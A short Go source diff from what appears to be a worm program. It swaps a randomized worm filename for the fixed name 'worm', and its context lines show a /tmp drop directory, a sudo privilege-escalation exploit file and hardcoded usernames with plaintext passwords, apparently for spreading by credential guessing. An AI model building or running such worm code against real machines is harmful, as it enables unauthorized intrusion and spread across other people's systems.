@@ -5,8 +5,6 @@ import (
 	//"log"
 	"time"
 	"bytes"
-	"strconv"
-	"math/rand"
 	"os"
 	"bufio"
 	//"fmt"
@@ -17,7 +15,7 @@ var (
 	password = "kali"
 	worm_dir = "/tmp"
 	sudo_exploit_filename = "exploit_nss_manual"
-	worm_filename = "worm" + strconv.Itoa(rand.Intn(3))
+	worm_filename = "worm"
 	timeout = time.Minute
 	users_const = [...]string {"enric", "guillem", "ubuntu", "manel", "lluis", "marti"}
 	pwds_const = [...]string {"arturitoRules", "GuillemXetoPass", "ubuntu", "PeatgeAp7", "JakeNineNine", "Martisu4presi"}
